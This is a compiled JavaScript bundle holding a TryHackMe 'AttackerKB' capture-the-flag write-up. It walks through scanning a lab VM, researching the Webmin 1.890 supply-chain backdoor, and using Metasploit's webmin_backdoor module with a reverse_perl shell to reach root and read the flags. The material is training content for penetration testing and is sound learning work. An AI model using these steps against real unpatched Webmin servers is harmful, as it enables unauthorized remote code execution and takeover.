"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9061],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>d});var a=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,o=function(e,t){if(null==e)return{};var n,a,o={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var s=a.createContext({}),p=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},h="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,o=e.mdxType,r=e.originalType,s=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),h=p(n),m=o,d=h["".concat(s,".").concat(m)]||h[m]||u[m]||r;return n?a.createElement(d,i(i({ref:t},c),{},{components:n})):a.createElement(d,i({ref:t},c))}));function d(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var r=n.length,i=new Array(r);i[0]=m;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[h]="string"==typeof e?e:o,i[1]=l;for(var p=2;p<r;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},98955:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>u,frontMatter:()=>r,metadata:()=>l,toc:()=>p});var a=n(87462),o=(n(67294),n(3905));const r={},i="AttackerKB",l={unversionedId:"Tryhackme/AttackerKB/AttackerKB",id:"Tryhackme/AttackerKB/AttackerKB",title:"AttackerKB",description:"Learn how to leverage AttackerKB and learn about exploits in your workflow!",source:"@site/writeups/Tryhackme/AttackerKB/AttackerKB.md",sourceDirName:"Tryhackme/AttackerKB",slug:"/Tryhackme/AttackerKB/",permalink:"/writeups/Tryhackme/AttackerKB/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Aster",permalink:"/writeups/Tryhackme/Aster/"},next:{title:"Attacking ICS Plant #1",permalink:"/writeups/Tryhackme/Attacking ICS Plant 1/Attacking ICS Plant"}},s={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"I&#39;m attacking what now?",id:"im-attacking-what-now",level:2},{value:"Discovering the Lay of the Land",id:"discovering-the-lay-of-the-land",level:2},{value:"Learning to Fly",id:"learning-to-fly",level:2},{value:"Blasting Away",id:"blasting-away",level:2},{value:"Going Further",id:"going-further",level:2}],c={toc:p},h="wrapper";function u(e){let{components:t,...n}=e;return(0,o.kt)(h,(0,a.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"attackerkb"},"AttackerKB"),(0,o.kt)("p",null,"Learn how to leverage AttackerKB and learn about exploits in your workflow!"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/attackerkb"},"AttackerKB")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Webmin 1.890 Exploit"),(0,o.kt)("li",{parentName:"ul"},"Metasploit (webmin_backdoor)")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"im-attacking-what-now"},"I'm attacking what now?"),(0,o.kt)("p",null,"Ever caught wind of a new vulnerability on Twitter or found something weird when examining a box? Fear no more, AttackerKB is here to make sense of it all! Throughout this room, we'll be examining how we can leverage AttackerKB both as an attacker and defender to gain further insight into the ever-changing landscape of vulnerabilities."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/DWPKIqo.png",alt:null})),(0,o.kt)("p",null,"A standalone version of the virtual machine used in this room can be found in this room. Additionally, you can download the OVA of Source for offline usage from ",(0,o.kt)("a",{parentName:"p",href:"https://www.darkstar7471.com/resources.html"},"https://www.darkstar7471.com/resources.html")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Read the above and move onto task two!")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("h2",{id:"discovering-the-lay-of-the-land"},"Discovering the Lay of the Land"),(0,o.kt)("p",null,"In this specific task, we'll be starting with the perspective of an attacker in a black-box assessment. Start by deploying and scanning the box in order to discover what has been installed."),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Deploy the virtual machine attached to this task. This deployment period will take about two minutes at the most.")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"Scan the machine with Nmap. What non-standard service can be found running on the high-port?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 14:47 CEST\nNmap scan report for 10.10.129.211\nHost is up (0.076s latency).\nNot shown: 65533 closed ports\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)\n|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)\n|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)\n10000/tcp open  http    MiniServ 1.890 (Webmin httpd)\n|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).\n|_http-trane-info: Problem with XML parsing of /evox/about\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 128.68 seconds\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Webmin")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"Further enumerate this service, what version of it is running?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"1.890")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"Visit the webpage generated by this service. You should encounter an error due to SSL being present. Change the URL to use HTTPS and ignore the exception. After this, view the certificate. What hostname can we find on the cert details? On Firefox, you can view this by clicking on the 'i' in the URL, then the '>' in Connection, 'More Information', and then 'View Certificate' on the Security tab.")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"source")),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},"Adjust your /etc/hosts file accordingly to include the newly discovered hostname and revisit the webpage in question. Note, that this will confirm that the service we previously discovered using Nmap is correct. Once you've done this, move onto task three.")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("h2",{id:"learning-to-fly"},"Learning to Fly"),(0,o.kt)("p",null,"Now that we've discovered a strange service running on our target, let's move onto further research to discover possible exploits and how valuable they might be with AttackerKB."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/bx2gGhz.png",alt:null})),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"First, let's navigate to AttackerKB! For our purposes, think of AttackerKB as similar to Exploit-DB but with a higher degree of information surrounding vulnerabilities and the exploits therein associated with them.")),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/8IZjtoE.png",alt:null})),(0,o.kt)("p",null,"The AKB dashboard at the time of writing. Note, we won't have to log in for what we're doing. That being said, logging in (via GitHub OAuth) allows us to post and contribute to discussions surrounding vulnerabilities."),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"AKB allows us to search for various vulnerabilities via the search bar at the top right of the site. Search now for 'Webmin' and click on 'password_change.cgi'")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection?referrer=search"},"Webmin password_change.cgi Command Injection"))),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"Take a look through the Assessments for this vulnerability. As an attacker, we can use the information posted here by other members to determine how value an exploit might be and any tweaks we might have to make to exploit code. Similarly, as a defender we can leverage these comments to gain additional situational information for vulnerabilities, allowing us to gauge how quickly we need to patch them. Which version of Webmin is immediately vulnerable to this exploit?")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://attackerkb.com/assessments/4601b37d-1e68-494e-be8b-c45be7ad424c"}))),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"1.890")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"What type of attack was this? Note, we're looking for how this was added to the code for Webmin, not how this results in remote code execution (RCE).")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"supply chain")),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},"Can you find a link to a post on the webmin's website explaining what happened? What day was Webmin informed of an 0day exploit?")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://www.webmin.com/exploit.html"},"Webmin 1.890 Exploit - What Happened?"))),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"August 17th 2019")),(0,o.kt)("ol",{start:6},(0,o.kt)("li",{parentName:"ol"},"Last but certainly not least, let's find the link to our exploit. We can see in the Assessments that a Metasploit module was added for this backdoor. What pull number was this added in?")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://github.com/rapid7/metasploit-framework/pull/12219"},"Add Webmin password_change.cgi backdoor exploit #12219"))),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"12219")),(0,o.kt)("ol",{start:7},(0,o.kt)("li",{parentName:"ol"},"Once you've located the exploit, let's move onto task four!")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("h2",{id:"blasting-away"},"Blasting Away"),(0,o.kt)("p",null,"Now that we've gained some insight into the vulnerability and its associated exploit that we've discovered, let's move back into the scope of an attacker. In this task we'll be leveraging Metasploit. If you have any difficulties here, I suggest checking out the RP: Metasploit room"),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/yMH9JLd.png",alt:null})),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Launch Metasploit now as we'll be leveraging the Metasploit module for this exploit.")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"msfconsole\n")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"With Metasploit open, search for and select the exploit we previously investigated.")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"msf5 > search webmin\n\nMatching Modules\n================\n\n   #  Name                                         Disclosure Date  Rank       Check  Description\n   -  ----                                         ---------------  ----       -----  -----------\n   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access\n   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure\n   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor\n   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution\n   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution\n   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"2 exploit/linux/http/webmin_backdoor 2019-08-10 excellent Yes Webmin password_change.cgi Backdoor")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"msf5 > use 2\n")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"Now that we've selected our exploit, set the options provided appropriately. Beyond RHOSTS and LHOST, what is the third option we must set to 'True'?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"msf5 exploit(linux/http/webmin_backdoor) > options\n\nModule options (exploit/linux/http/webmin_backdoor):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      10000            yes       The target port (TCP)\n   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT    8080             yes       The local port to listen on.\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /                yes       Base path to Webmin\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (cmd/unix/reverse_perl):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic (Unix In-Memory)\n\nmsf5 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.129.211\nRHOSTS => 10.10.129.211\nmsf5 exploit(linux/http/webmin_backdoor) > set LHOST 10.8.106.222\nLHOST => 10.8.106.222\nmsf5 exploit(linux/http/webmin_backdoor) > set SSL true\nSSL => true\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"SSL false no Negotiate SSL/TLS for outgoing connections")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"Run the exploit. What is the user flag?")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"msf5 exploit(linux/http/webmin_backdoor) > run\n\n[*] Started reverse TCP handler on 10.8.106.222:4444\n[*] Configuring Automatic (Unix In-Memory) target\n[*] Sending cmd/unix/reverse_perl command payload\n[*] Command shell session 1 opened (10.8.106.222:4444 -> 10.10.129.211:37060) at 2020-09-26 15:26:45 +0200\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"python -c \"import pty; pty.spawn('/bin/bash')\"\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"root@source:/usr/share/webmin/# find / -name user.txt\nfind / -name user.txt\n/home/dark/user.txt\nroot@source:/usr/share/webmin/# cat /home/dark/user.txt\ncat /home/dark/user.txt\nTHM{SUPPLY_CHAIN_COMPROMISE}\nroot@source:/usr/share/webmin/# cat /root/root.txt\ncat /root/root.txt\nTHM{UPDATE_YOUR_INSTALL}\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{SUPPLY_CHAIN_COMPROMISE}")),(0,o.kt)("ol",{start:5},(0,o.kt)("li",{parentName:"ol"},"How about the root flag?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{UPDATE_YOUR_INSTALL}")),(0,o.kt)("ol",{start:6},(0,o.kt)("li",{parentName:"ol"},"Once you've completed gaining the root flag, move onto the fifth and final task.")),(0,o.kt)("h2",{id:"going-further"},"Going Further"),(0,o.kt)("p",null,"Want to get even more out of AttackerKB? Check out the AKB Explorer by ",(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/p/Horshark"},"Horshark"),"! Written in python, AKB Explorer provides similar functionality to Searchsploit, expanded to encompass the features of AKB. Using this tool, you can search by name, CVE, and username for posts! Check it out here: ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/horshark/akb-explorer"},"Link")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Read the above and keep learning!")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")))}u.isMDXComponent=!0}}]);